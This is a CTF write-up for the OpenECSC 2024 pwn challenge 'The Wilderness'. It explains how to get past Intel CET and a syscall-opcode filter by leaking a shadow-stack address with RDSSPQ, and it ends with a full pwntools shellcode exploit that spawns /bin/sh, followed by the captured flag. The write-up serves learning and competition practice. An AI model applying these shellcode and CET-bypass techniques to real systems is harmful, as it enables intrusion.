---
title: 'OpenECSC 2024 - Round 2'
challenge: 'The Wilderness'
date: 2024-04-29T00:00:00+01:00
author: 'v0lp3'
description: 'Writeup for the OpenECSC 2024 - Round 2 CTF challenge "The Wilderness"' 
cover: '/img/openECSC/logo.png'
tags: ['pwn', 'shellcode', 'intel cet']
draft: false
---

**tl;dr**

The challenge requires input of our shellcode's bytecode. There are several constraints that increase the difficulty:

- The environment relies on [Intel CET: Control Flow Enforcement Technology](https://www.intel.com/content/www/us/en/developer/articles/technical/technical-look-control-flow-enforcement-technology.html).
- Forbidden opcodes include traps such as syscall, sysexit, and int80.
- **All** registers are cleared.
- Our shellcode cannot contain `\x00` bytes.
- The shellcode is executed in a memory area that is only readable and executable, thus polymorphic shellcode cannot be used.

## First step

Upon uncompressed, the archive provided by the challenge contains the following files:

```bash
$ tree --filelimit 5
.
├── Dockerfile
├── build
│   └── the_wilderness
├── docker-compose.yml
├── run.sh
└── sde-external-9.33.0-2024-01-07-lin
```

We can observe from ./run.sh that the binary is executed using the [Intel Software Development Emulator (Intel SDE)](https://www.intel.com/content/www/us/en/developer/articles/tool/software-development-emulator.html).

```
#!/bin/sh

echo "[+] starting challenge..."
/home/user/sde/sde64 -no-follow-child -cet -cet_output_file /dev/null -- /home/user/build/the_wilderness
echo "[+] challenge stopped"
```

It's worth noting that the flag `-cet` is in use, which indicates the implementation of control flow enforcement technology.

## Environment setup

I made two changes to the files to set up the debug environment:
- Added the flag `-debug` in the *run.sh* file
- Modified the *Dockerfile* to install gdb and [gef extension](https://github.com/hugsy/gef).

## Code review

Shifting our focus to the `get_code` function within the binary, we can observe the following:

- The memory is always mapped at the address `0xdead000`
- Initially, the memory is set as readable and writable with `PROT_READ | PROT_WRITE` (3).

{{< figure src="/img/openECSC/the_wilderness/mmap.png" position="left" caption="0xdead000 mmap" captionPosition="left">}}

- Before execution, the permissions of the mapped area `0xdead000` are changed to `PROT_EXEC | PROT_READ` (5) using *[mprotect](https://man7.org/linux/man-pages/man2/mprotect.2.html)*.

{{< figure src="/img/openECSC/the_wilderness/mprotect.png" position="left" caption="0xdead000 mprotect" captionPosition="left">}}

- Our input cannot contain the bytecode `\x00`.

{{< figure src="/img/openECSC/the_wilderness/holes.png" position="left" caption="holes check" captionPosition="left">}}

- The input must not include trap instructions such as *syscall*, *sysenter*, or *int80*.

{{< figure src="/img/openECSC/the_wilderness/traps_check.png" position="left" caption="traps check" captionPosition="left">}}

{{< figure src="/img/openECSC/the_wilderness/traps_blacklist.png" position="left" caption="traps blacklist" captionPosition="left">}}

In the `run_code` function, all registers are cleared, including the SIMD registers. Furthermore, before executing the shellcode, even the fs and gs base are zeroed, eliminating any possibility of leaking addresses.
## Divide et impera

### Problem 1: Intel Control Flow Enforcement Technology

Intel Control Flow Enforcement Technology (CET) is a mitigation measure aimed at thwarting techniques like Return-Oriented Programming (ROP) and Jump-Oriented Programming (JOP). Essentially, after a return or a jump, the next expected instruction is an `endbr64`. If this expectation is not met, the subsequent instruction will trigger a segmentation fault.

#### Solution

In this scenario, we have complete control over the instruction that will be executed. Essentially, we need to place `endbr64` at the beginning of our shellcode.

### Problem 2: Traps are forbidden

Traps instructions are prohibited, and the code that checks for this behavior appears to be robust. We are not allowed to use the *syscall*, *sysenter*, or *int80* instructions.

#### Solution

We can exploit the fact that a reference to `syscall` is present in the binary. When `arch_prctl` is called, it will invoke `syscall` from the libc. If we can obtain a leak of the address of the binary, we can then jump to the syscall entry in the PLT (Procedure Linkage Table).

### Problem 3: No leak?

The unsettling aspect of this challenge is that everything is zeroed out. All general-purpose registers and even special ([SIMD](https://en.wikipedia.org/wiki/Single_instruction,_multiple_data)) ones are cleared. Even the base of `fs` and `gs` is set to zero.

#### Solution

To overcome this problem, we need to find an instruction that will cause a leak in the registers. After some searching, I decided to skim through all the instructions of the [x86/x64 architecture](https://www.felixcloutier.com/x86/) architecture. Finally, I came across [RDSSPD/RDSSPQ](https://www.felixcloutier.com/x86/rdsspd:rdsspq). This instruction, when Intel CET shadow stack is enabled, will indeed cause a leak in the specified register.
## Exploit

Here is the full script:

```python
from pwn import *

context.arch = "amd64"

DEBUG = False

if DEBUG:
        import clipboard
        r = remote("127.0.0.1", 1337)
        r.recvuntil("remote ")
        port = r.recvline(keepends=False).decode()
        clipboard.copy(f"target remote :{port}")
else:
        r = remote("thewilderness.challs.open.ecsc2024.it", 38012)

shellcode = []

# bypass CET
shellcode += ["endbr64"]

# Get a PIE leak

shellcode += ["rdsspq rsp"] # rsp now contains a shadow stack pointer leak
shellcode += ["mov rbx, [rsp]"] # rbx now contains a PIE leak

# prepare arguments to syscall from libc

shellcode += ["xor rdi, rdi"]
shellcode += ["xor rdi, 59"] # execve syscall
shellcode += ["xor rsi, rsi"]
shellcode += ["xor rsi, 0xdead02a"] # address of /bin/sh

# Call plt[syscall]

shellcode += ["sub bx, 0x1563"] # subtract main+63 offset
shellcode += ["add bx, 0x126f"] # offset of plt[syscall]
shellcode += ["call rbx"] # call plt[syscall]

shellcode += ['.ascii "/bin/sh"']

shellcode = asm("\n".join(shellcode))

r.sendlineafter(b"Wilderness?", str(len(shellcode)).encode())
r.sendlineafter(b"Wilderness?", shellcode)

log.info("Got shell ?!")

r.interactive()
```

> openECSC{h3r3_1n_th3_wild3rness_w3_l1ke_h1d1ng_1n_the_sh4dow_64d70520}